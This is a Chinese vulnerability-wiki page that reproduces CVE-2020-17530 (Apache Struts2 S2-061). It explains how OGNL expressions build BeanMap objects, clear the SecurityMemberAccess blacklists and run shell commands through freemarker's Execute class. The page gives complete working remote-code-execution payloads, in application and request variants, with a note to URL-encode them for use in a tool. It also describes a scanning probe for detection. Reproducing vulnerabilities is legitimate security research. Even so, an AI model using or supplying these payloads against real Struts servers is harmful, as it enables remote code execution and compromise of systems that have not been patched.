<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Apache%20Struts/%EF%BC%88CVE-2020-17530%EF%BC%89S2-061/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2020-17530）S2-061 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2020-17530\uff09S2-061", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c", url: "#_2" },
              {title: "\u6f0f\u6d1e\u5206\u6790", url: "#_3" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
              {title: "\u5b8c\u6574POC", url: "#poc" },
              {title: "\u68c0\u6d4b\u601d\u8def", url: "#_8" },
              {title: "\u603b\u7ed3", url: "#_9" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-xxxx-xxxx%EF%BC%89s2-002/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-xxxx-xxxx%EF%BC%89s2-002/" class="btn btn-xs btn-link">
        （CVE-xxxx-xxxx）s2-002
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2019-0230%EF%BC%89s2-09/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2019-0230%EF%BC%89s2-09/" class="btn btn-xs btn-link">
        （CVE-2019-0230）s2-09
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2020-17530s2-061">（CVE-2020-17530）S2-061<a class="headerlink" href="#cve-2020-17530s2-061" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>本次漏洞是对<code>S2-059</code>漏洞修复后的绕过。<code>S2-059</code>的修复补丁仅修复了沙盒绕过，但是并没有修复OGNL表达式的执行。但是在最新版本<code>2.5.26</code>版本中OGNL表达式的执行也修复了。</p>
<h2 id="_2">漏洞影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>struts 2.0.0 - struts 2.5.25
</code></pre></div>
<h2 id="_3">漏洞分析<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>本文仅是对<code>S2-061</code>进行复现，并且对复现的过程进行记录，具体的分析思路可以参考 <a href="https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g">安恒信息安全研究院-Struts2 S2-061漏洞分析(CVE-2020-17530)</a></p>
<p>*Smi1e*师傅tql 膜了 呜呜呜</p>
<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<h3 id="_5">测试环境<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code>    IDEA 2019.3.5
    Struts2 2.5.26/Struts2 2.3.33
    Apache-Tomcat-8.5.57
</code></pre></div>
<h3 id="_6">相关依赖包<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
<hr />
<blockquote>
<p>注意，搭建测试环境的时候，除了下载struts2的最小依赖包(<code>struts-2.x.xx-min-lib.zip</code>)以外，本次的环境，还需要依赖同版本包下的<code>commons-collections-x.x.jar</code>，可以在<code>struts-2.x.xx-lib.zip</code>中找到版本对应的包，后续会说明为什么一定需要这个包。</p>
</blockquote>
<p>2.3.3相关依赖包</p>
<p><a href="https://p1.ssl.qhimg.com/t01af16c23332dea10c.png"><img alt="img" src="../resource/%EF%BC%88CVE-2020-17530%EF%BC%89S2-061/media/t01af16c23332dea10c.png" /></a></p>
<p>2.5.25相关依赖包</p>
<p><a href="https://p3.ssl.qhimg.com/t01eb70f4425f4ccda6.png"><img alt="img" src="../resource/%EF%BC%88CVE-2020-17530%EF%BC%89S2-061/media/t01eb70f4425f4ccda6.png" /></a></p>
<h3 id="_7">复现思路简略说明（具体思路请移步上文中的漏洞分析文章）<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
<p>首先找到**struts2**标签解析的入口，也是我们本次漏洞**Debug**跟踪的重点。</p>
<p><a href="https://p1.ssl.qhimg.com/t01c8a8c1fbcfa0e98b.png"><img alt="img" src="../resource/%EF%BC%88CVE-2020-17530%EF%BC%89S2-061/media/t01c8a8c1fbcfa0e98b.png" /></a></p>
<p>全方法名：<code>org.apache.struts2.views.jsp.ComponentTagSupport#doStartTag</code></p>
<p>这里是标签解析的开始方法，同时这里能够观测到整个<code>OgnlValueStack</code>对象，也是我们开始寻找利用点的地方。</p>
<p>其中我们本次要使用的利用点就stack中断点可以找到（这一步在前面的思路分析中可以找到，但是因为debug点没有描述清楚，一开始找了很久，最后在查阅其他版本的文章分析才找到这个位置）:</p>
<p><a href="https://p2.ssl.qhimg.com/t01b8b198a68619856c.png"><img alt="img" src="../resource/%EF%BC%88CVE-2020-17530%EF%BC%89S2-061/media/t01b8b198a68619856c.png" /></a></p>
<p>从上文中的位置，我们可以得到获取这个对象的获取调用链，如下图</p>
<p><a href="https://p5.ssl.qhimg.com/t017c67f80e473f864e.png"><img alt="img" src="../resource/%EF%BC%88CVE-2020-17530%EF%BC%89S2-061/media/t017c67f80e473f864e.png" /></a></p>
<p>转换为ognl表达式后如下：<code>#application.get('org.apache.tomcat.InstanceManager')</code></p>
<p><code>org.apache.catalina.core.DefaultInstanceManager</code> 的方法不做过多描述，借用分析文章中的一张图，可以使用这个对象中的<code>newInstance</code>方法实例化任意无参构造方法的类并返回。</p>
<p><a href="https://p5.ssl.qhimg.com/t01e02bcee321468f8b.png"><img alt="img" src="../resource/%EF%BC%88CVE-2020-17530%EF%BC%89S2-061/media/t01e02bcee321468f8b.png" /></a></p>
<p>创建<code>org.apache.commons.collections.BeanMap</code>对象(本次的漏洞复现的主角，同时这个包就在<code>commons-collections-x.x.jar</code>中)</p>
<p><a href="https://p0.ssl.qhimg.com/t018d8bd1870f920902.png"><img alt="img" src="../resource/%EF%BC%88CVE-2020-17530%EF%BC%89S2-061/media/t018d8bd1870f920902.png" /></a></p>
<p>API简要描述（若想看详细方法分析，请移步到上文的分析文章）:</p>
<div class="highlight"><pre><span></span><code>       Object get(&quot;xxxx&quot;)            实际相当于调用内部对象的getXxx,比如getName()
       Object put(&quot;xxxx&quot;,Object)    实际相当于调用内部对象的,setXxxx,比如setName()
       void setBean(Object)        重新设置内部对象，设置完成后上面两个才能生效
       Object getBean()            获取内部对象，这里可以在断点的时候查看到当前map中的实际对象
</code></pre></div>
<p>整体创建的Ognl表达式（这里存放到application中，方便多次请求使用）</p>
<div class="highlight"><pre><span></span><code>%{#application.map=#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;org.apache.commons.collections.BeanMap&#39;)}
</code></pre></div>
<p>获取到<code>OgnlContext</code>对象 （实际就是<code>#attr</code> 、<code>#request</code> 等map对象中的 <code>struts.valueStack</code>）并且设置到上一步的BeanMap中，用于绕过沙盒限制，进行内部方法调用。</p>
<p><a href="https://p2.ssl.qhimg.com/t01e4878c6396e917f0.png"><img alt="img" src="../resource/%EF%BC%88CVE-2020-17530%EF%BC%89S2-061/media/t01e4878c6396e917f0.png" /></a></p>
<p>Ognl表达式代码</p>
<div class="highlight"><pre><span></span><code>%{#application.map.setBean(#request.get(&#39;struts.valueStack&#39;))}
</code></pre></div>
<p>使用3和4同样的原理，利用 <code>BeanMap</code>使用<code>com.opensymphony.xwork2.ognl.OgnlValueStack</code> 中的 <code>getContext</code> 方法间接获取到 <code>OgnlContext</code>,并且重新设置到一个新的BeanMap中。</p>
<p><a href="https://p4.ssl.qhimg.com/t010834ecdfe2788525.png"><img alt="img" src="../resource/%EF%BC%88CVE-2020-17530%EF%BC%89S2-061/media/t010834ecdfe2788525.png" /></a></p>
<p>这里把两个步骤的Ognl代码同时贴出来</p>
<div class="highlight"><pre><span></span><code>   # 注意，自行调试的话，需要分两次执行
   %{#application.map2=#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;org.apache.commons.collections.BeanMap&#39;)}

   %{#application.map2.setBean(#application.get(&#39;map&#39;).get(&#39;context&#39;))}
</code></pre></div>
<p>使用上面的原理，使用第二步得到的<code>OgnlContext</code>获取到内部的<code>com.opensymphony.xwork2.ognl.SecurityMemberAccess</code>对象，在设置到新的BeanMap中，用于重置黑名单</p>
<p><a href="https://p0.ssl.qhimg.com/t011ca666d244cfde75.png"><img alt="img" src="../resource/%EF%BC%88CVE-2020-17530%EF%BC%89S2-061/media/t011ca666d244cfde75.png" /></a></p>
<div class="highlight"><pre><span></span><code># 注意，自行调试的话，需要分两次执行
%{#application.map3=#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;org.apache.commons.collections.BeanMap&#39;)}

%{#application.map3.setBean(#application.get(&#39;map2&#39;).get(&#39;memberAccess&#39;))}
</code></pre></div>
<p>确认一下之前存放的Map都正确存下来了，不然岂不是白忙活，其实每一步执行完后，都可以查看一次，确认每一步都是操作正确的，这里我就一次过了。</p>
<p><a href="https://p3.ssl.qhimg.com/t013ad7a8fe1ab70f12.png"><img alt="img" src="../resource/%EF%BC%88CVE-2020-17530%EF%BC%89S2-061/media/t013ad7a8fe1ab70f12.png" /></a></p>
<p>前面的操作都确认没有问题后，就可以调用方法重置黑名单了，主要API为<code>com.opensymphony.xwork2.ognl.SecurityMemberAccess#setExcludedClasses</code>和<code>com.opensymphony.xwork2.ognl.SecurityMemberAccess#setExcludedPackageNames</code>,如下图</p>
<p><a href="https://p3.ssl.qhimg.com/t01c2e6c54f3ae65a16.png"><img alt="img" src="../resource/%EF%BC%88CVE-2020-17530%EF%BC%89S2-061/media/t01c2e6c54f3ae65a16.png" /></a></p>
<p>在我们这两个地方打了断点后，我们请求下面或者前面的ognl可以发现，在每次收到请求的时候，都会调用一次这里的黑名单赋值，也就是说，就算是我们在本次请求重置了黑名单，在下次请求的时候，黑名单还是会重置。因此只有前面的ognl可以持久化存储，实际利用的时候，必须要在一个请求中进行命令执行。下文还会有一个存放在<code>request</code>中的poc。</p>
<p>初次请求赋值:</p>
<p><a href="https://p1.ssl.qhimg.com/t0142df8c70636a114c.png"><img alt="img" src="../resource/%EF%BC%88CVE-2020-17530%EF%BC%89S2-061/media/t0142df8c70636a114c.png" /></a></p>
<p><a href="https://p0.ssl.qhimg.com/t01379e24755f960042.png"><img alt="img" src="../resource/%EF%BC%88CVE-2020-17530%EF%BC%89S2-061/media/t01379e24755f960042.png" /></a></p>
<p>执行下面清空黑名单代码的重新赋值</p>
<p><a href="https://p4.ssl.qhimg.com/t01d2429986989dd32b.png"><img alt="img" src="../resource/%EF%BC%88CVE-2020-17530%EF%BC%89S2-061/media/t01d2429986989dd32b.png" /></a></p>
<p><a href="https://p1.ssl.qhimg.com/t01baaac573fe9b5d3a.png"><img alt="img" src="../resource/%EF%BC%88CVE-2020-17530%EF%BC%89S2-061/media/t01baaac573fe9b5d3a.png" /></a></p>
<p>清7空黑名单的ognl代码</p>
<div class="highlight"><pre><span></span><code># 注意，自行调试的话，需要分两次执行
   #application.get(&#39;map3&#39;).put(&#39;excludedPackageNames&#39;,#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;java.util.HashSet&#39;))

   #application.get(&#39;map3&#39;).put(&#39;excludedClasses&#39;,#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;java.util.HashSet&#39;))
</code></pre></div>
<p>这里就可以使用黑名单中的<code>freemarker.template.utility.Execute</code>类中的<code>exec</code>方法执行Shell了。需要最少和前面的8一起使用，才能执行成功。可以直接使用最后面的完整poc代码执行。</p>
<p><a href="https://p2.ssl.qhimg.com/t014b4b37153a9ab5bc.png"><img alt="img" src="../resource/%EF%BC%88CVE-2020-17530%EF%BC%89S2-061/media/t014b4b37153a9ab5bc.png" /></a></p>
<p><a href="https://p2.ssl.qhimg.com/t0107791381f8c2bd7b.png"><img alt="img" src="../resource/%EF%BC%88CVE-2020-17530%EF%BC%89S2-061/media/t0107791381f8c2bd7b.png" /></a></p>
<p>执行shell的ognl代码</p>
<div class="highlight"><pre><span></span><code>#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;freemarker.template.utility.Execute&#39;).exec({&#39;calc.exe&#39;})
</code></pre></div>
<h2 id="poc">完整POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
<h3 id="applicationpoc">使用application，就是上面思路的完整POC<a class="headerlink" href="#applicationpoc" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code>%{
(#application.map=#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;org.apache.commons.collections.BeanMap&#39;)).toString().substring(0,0) + 
(#application.map.setBean(#request.get(&#39;struts.valueStack&#39;)) == true).toString().substring(0,0) + 

(#application.map2=#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;org.apache.commons.collections.BeanMap&#39;)).toString().substring(0,0) +
(#application.map2.setBean(#application.get(&#39;map&#39;).get(&#39;context&#39;)) == true).toString().substring(0,0) + 


(#application.map3=#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;org.apache.commons.collections.BeanMap&#39;)).toString().substring(0,0) + 
(#application.map3.setBean(#application.get(&#39;map2&#39;).get(&#39;memberAccess&#39;)) == true).toString().substring(0,0) + 

(#application.get(&#39;map3&#39;).put(&#39;excludedPackageNames&#39;,#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;java.util.HashSet&#39;)) == true).toString().substring(0,0) + 
(#application.get(&#39;map3&#39;).put(&#39;excludedClasses&#39;,#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;java.util.HashSet&#39;)) == true).toString().substring(0,0) +

(#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;freemarker.template.utility.Execute&#39;).exec({&#39;calc.exe&#39;}))
}
</code></pre></div>
<h3 id="requestpoc">使用request，单次请求有效的完整POC (推荐)<a class="headerlink" href="#requestpoc" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code>%{
(#request.map=#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;org.apache.commons.collections.BeanMap&#39;)).toString().substring(0,0) + 
(#request.map.setBean(#request.get(&#39;struts.valueStack&#39;)) == true).toString().substring(0,0) + 

(#request.map2=#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;org.apache.commons.collections.BeanMap&#39;)).toString().substring(0,0) +
(#request.map2.setBean(#request.get(&#39;map&#39;).get(&#39;context&#39;)) == true).toString().substring(0,0) + 


(#request.map3=#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;org.apache.commons.collections.BeanMap&#39;)).toString().substring(0,0) + 
(#request.map3.setBean(#request.get(&#39;map2&#39;).get(&#39;memberAccess&#39;)) == true).toString().substring(0,0) + 

(#request.get(&#39;map3&#39;).put(&#39;excludedPackageNames&#39;,#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;java.util.HashSet&#39;)) == true).toString().substring(0,0) + 
(#request.get(&#39;map3&#39;).put(&#39;excludedClasses&#39;,#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;java.util.HashSet&#39;)) == true).toString().substring(0,0) +

(#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;freemarker.template.utility.Execute&#39;).exec({&#39;calc.exe&#39;}))
}
</code></pre></div>
<blockquote>
<p>注意：请使用url对以上的OGNL代码编码后，再在工具上使用。</p>
</blockquote>
<h2 id="_8">检测思路<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
<p>在新版本的struts2中，已经不能通过参数构造来解析ognl表达式了，所以如果考虑想要使用脚本来进行批量扫描是否有本漏洞的时候，可以考虑直接爆破所有参数，然后判断页面中是否有预计的结果文本即可。</p>
<p>比如：</p>
<p>%{ ‘gcowsec-‘ + (2000 + 20).toString()}</p>
<p>预计会得到</p>
<p>gcowsec-2020</p>
<p>使用脚本判断结果中是否包含就可以了</p>
<h2 id="_9">总结<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h2>
<p>此次漏洞只是<code>S2-059</code>修复的一个绕过，并且本次利用的核心类<code>org.apache.commons.collections.BeanMap</code>在<code>commons-collections-x.x.jar</code>包中，但是在官方的最小依赖包中并没有包含这个包。所以即使扫到了支持OGNL表达式的注入点，但是如果没有使用这个依赖包，也还是没办法进行利用。</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-xxxx-xxxx%EF%BC%89s2-002/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-xxxx-xxxx%EF%BC%89s2-002/" class="btn btn-xs btn-link">
        （CVE-xxxx-xxxx）s2-002
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2019-0230%EF%BC%89s2-09/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2019-0230%EF%BC%89s2-09/" class="btn btn-xs btn-link">
        （CVE-2019-0230）s2-09
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>